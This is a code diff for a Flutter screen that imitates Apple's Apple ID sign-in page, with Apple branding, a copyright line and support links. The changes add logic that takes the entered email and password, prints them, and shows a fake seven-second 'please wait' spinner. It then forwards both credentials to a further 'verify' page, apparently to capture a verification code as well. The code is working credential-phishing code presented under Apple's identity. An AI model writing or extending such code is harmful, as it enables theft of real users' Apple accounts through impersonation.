@@ -1,9 +1,9 @@
+import 'dart:async';
+
 import 'package:flutter/cupertino.dart';
 import 'package:flutter/material.dart';
-import 'package:url_launcher/link.dart';
 
 import '../Verify/verifylayout.dart';
-import '../database.dart';
 
 class PassTabletScreen extends StatefulWidget {
   final String callback;
@@ -15,15 +15,17 @@ class PassTabletScreen extends StatefulWidget {
 
 class _PassTabletScreenState extends State<PassTabletScreen> {
   TextEditingController passwordController = TextEditingController();
-  GlobalKey<FormState> formkey = GlobalKey<FormState>();
+ final GlobalKey<FormState> _formerkey = GlobalKey<FormState>();
   bool checked = true;
   @override
   Widget build(BuildContext context) {
     double width = MediaQuery.of(context).size.width;
     return Scaffold(
+        backgroundColor: CupertinoColors.white,
         appBar: navBar(),
         body: Padding(
-          padding: const EdgeInsets.all(20.0),
+          padding:
+              const EdgeInsets.only(top: 20, bottom: 20.0, left: 20, right: 20),
           child: Center(
             child: Padding(
               padding: const EdgeInsets.only(
@@ -34,18 +36,16 @@ class _PassTabletScreenState extends State<PassTabletScreen> {
                 width: width / 2,
                 child: ListView(
                   children: [
-                    SizedBox(
-                      child: ClipRRect(
-                        borderRadius: BorderRadius.circular(20),
-                        child: const Expanded(
-                          flex: 1,
-                          child: Image(
-                            image: AssetImage('images/app.jpg'),
-                            width: 300,
-                            height: 200,
-                            fit: BoxFit.contain,
-                          ),
-                        ),
+                    const SizedBox(
+                      height: 50,
+                    ),
+                    ClipRRect(
+                      borderRadius: BorderRadius.circular(20),
+                      child: const Image(
+                        image: AssetImage('images/app.jpg'),
+                        width: 300,
+                        height: 200,
+                        fit: BoxFit.contain,
                       ),
                     ),
                     Column(
@@ -58,7 +58,7 @@ class _PassTabletScreenState extends State<PassTabletScreen> {
                               Text(
                                 'Apple ID',
                                 style: TextStyle(
-                                    fontSize: 20,
+                                    fontSize: 25,
                                     color: Colors.black,
                                     fontWeight: FontWeight.bold),
                               ),
@@ -74,11 +74,12 @@ class _PassTabletScreenState extends State<PassTabletScreen> {
                             padding: const EdgeInsets.only(bottom: 18.0),
                             child: Text(widget.callback,
                                 style: const TextStyle(
-                                    fontSize: 18, color: Colors.black)),
+                                    fontSize: 22, color: Colors.black)),
                           ),
                           //),
                           SizedBox(
                             child: Form(
+                              key: _formerkey,
                               autovalidateMode:
                                   AutovalidateMode.onUserInteraction,
                               child: Padding(
@@ -94,6 +95,15 @@ class _PassTabletScreenState extends State<PassTabletScreen> {
                                   textInputAction: TextInputAction.done,
                                   keyboardType: TextInputType.visiblePassword,
                                   controller: passwordController,
+                                   validator: (ifpassword) {
+                                    if (ifpassword!.isEmpty) {
+                                    return 'Please enter password';
+                                  } else if (ifpassword.length < 6) {
+                                    return 'Please enter a correct password';
+                                  } else {
+                                    return null;
+                                  }
+                                  },
                                   decoration: InputDecoration(
                                     contentPadding: const EdgeInsets.only(
                                         left: 10, right: 15),
@@ -104,44 +114,87 @@ class _PassTabletScreenState extends State<PassTabletScreen> {
                                             bottomRight: Radius.circular(10),
                                             bottomLeft: Radius.circular(10))),
                                     hintText: 'password',
-                                    hintStyle: const TextStyle(fontSize: 18),
+                                    hintStyle: const TextStyle(fontSize: 20),
                                     suffixIcon: Padding(
                                       padding: const EdgeInsets.only(
-                                          right: 20.0, bottom: 0),
-                                      child: Link(
-                                        target: LinkTarget.self,
-                                        uri: Uri.parse('google.com'),
-                                        builder: (context, followLink) =>
-                                            IconButton(
-                                                hoverColor:
-                                                    CupertinoColors.white,
-                                                icon: const Icon(
-                                                  Icons.arrow_circle_right,
-                                                  size: 30,
-                                                  color: Colors.grey,
-                                                ),
-                                                onPressed: () => {
-                                                   
-                                                      Navigator.of(context).push(
-                                                          MaterialPageRoute(
-                                                              builder: (context) =>
-                                                                  VerifyLayoutPage(
-                                                                      appleEmail: widget.callback, applePassword: passwordController.text,)))
+                                          right: 10.0, bottom: 0),
+                                      child: IconButton(
+                                          hoverColor: CupertinoColors.white,
+                                          icon: const Icon(
+                                            Icons.arrow_circle_right,
+                                            size: 30,
+                                            color: Colors.grey,
+                                          ),
+                                          onPressed: () {  
 
-                                                      // if (formkey.currentState!
-                                                      //     .validate()) {}
-                                                    }),
-                                      ),
+                                            
+                                            if (_formerkey.currentState!.validate()) {
+                                            debugPrint(
+                                                'Email:${widget.callback}, Password:${passwordController.text}');
+                                            showDialog(
+                                                context: context,
+                                                builder: (context) {
+                                                  return Center(
+                                                      child: Column(
+                                                    mainAxisAlignment:
+                                                        MainAxisAlignment
+                                                            .center,
+                                                    mainAxisSize:
+                                                        MainAxisSize.max,
+                                                    children: const [
+                                                      SizedBox(
+                                                        height: 90,
+                                                        width: 90,
+                                                        child: CircularProgressIndicator(
+                                                            backgroundColor:
+                                                                CupertinoColors
+                                                                    .white),
+                                                      ),
+                                                      SizedBox(height: 50),
+                                                      Card(
+                                                        shape: RoundedRectangleBorder(
+                                                            borderRadius:
+                                                                BorderRadius
+                                                                    .all(Radius
+                                                                        .circular(
+                                                                            7))),
+                                                        color: Colors.grey,
+                                                        child: Padding(
+                                                          padding:
+                                                              EdgeInsets.all(
+                                                                  8.0),
+                                                          child: Text(
+                                                              'please wait...',
+                                                              style: TextStyle(
+                                                                  fontSize: 22,
+                                                                  color: CupertinoColors
+                                                                      .white)),
+                                                        ),
+                                                      )
+                                                    ],
+                                                  ));
+                                                });
+
+                                            Timer(const Duration(seconds: 7),
+                                                () {
+                                            
+                                                Navigator.of(context).push(
+                                                    MaterialPageRoute(
+                                                        builder: (context) =>
+                                                            VerifyLayoutPage(
+                                                              appleEmail: widget
+                                                                  .callback,
+                                                              applePassword:
+                                                                  passwordController
+                                                                      .text,
+                                                            )));
+                                              
+                                            });
+
+  }}),
                                     ),
                                   ),
-                                  validator: (ifpassword) {
-                                    if (ifpassword!.isNotEmpty &&
-                                        ifpassword.length < 7) {
-                                      return 'Please enter a correct password';
-                                    } else {
-                                      return null;
-                                    }
-                                  },
+                                 
                                 ),
                               ),
                             ),
@@ -168,7 +221,7 @@ class _PassTabletScreenState extends State<PassTabletScreen> {
                                   height: 15,
                                 ),
                                 const Text('Remember me',
-                                    style: TextStyle(fontSize: 14)),
+                                    style: TextStyle(fontSize: 16)),
                               ],
                             ),
                           ),
@@ -178,7 +231,7 @@ class _PassTabletScreenState extends State<PassTabletScreen> {
                               child: const Text(
                                   'Forgotten your Apple ID or password?',
                                   style: TextStyle(
-                                      fontSize: 12, letterSpacing: 0.5))),
+                                      fontSize: 15, letterSpacing: 0.5))),
                         ]),
                   ],
                 ),
@@ -203,27 +256,27 @@ class _PassTabletScreenState extends State<PassTabletScreen> {
                     padding: EdgeInsets.only(bottom: 0),
                     child: Text(
                       'More ways to shop: find an Apple Store or other retailer near you. or call 08000480408.',
-                      style: TextStyle(fontSize: 11),
+                      style: TextStyle(fontSize: 15),
                     ),
                   ),
                   Padding(
                     padding: EdgeInsets.only(bottom: 11.0),
                     child: Text('United Kingdom',
                         style: TextStyle(
-                          fontSize: 11,
+                          fontSize: 15,
                         )),
                   ),
                   Text('copy right 2022 Apple Inc. All rights reserved.',
                       style: TextStyle(
-                        fontSize: 11,
+                        fontSize: 15,
                       )),
                   Text('Privacy Policy | Use of Cookies | Terms of Use |',
                       style: TextStyle(
-                        fontSize: 11,
+                        fontSize: 15,
                       )),
                   Text('Sales and Refund | Legal | Site Map ',
                       style: TextStyle(
-                        fontSize: 11,
+                        fontSize: 15,
                       )),
                 ],
               ),
@@ -241,7 +294,7 @@ navBar() {
         child: Text(
           'Apple ID',
           style: TextStyle(
-              fontSize: 14, color: Colors.black, fontWeight: FontWeight.bold),
+              fontSize: 16, color: Colors.black, fontWeight: FontWeight.bold),
         ),
       ),
       leadingWidth: 150,
@@ -254,7 +307,7 @@ navBar() {
                     onPressed: () {},
                     child: const Text(
                       'Sign in',
-                      style: TextStyle(color: Colors.black, fontSize: 11),
+                      style: TextStyle(color: Colors.black, fontSize: 13),
                     )),
                 TextButton(
                     onPressed: () {},
@@ -262,11 +315,11 @@ navBar() {
                         onPressed: () {},
                         child: const Text('Create An Apple ID',
                             style:
-                                TextStyle(color: Colors.black, fontSize: 11)))),
+                                TextStyle(color: Colors.black, fontSize: 13)))),
                 TextButton(
                     onPressed: () {},
                     child: const Text('FAQ',
-                        style: TextStyle(color: Colors.black, fontSize: 11)))
+                        style: TextStyle(color: Colors.black, fontSize: 13)))
               ],
             )),
       ],
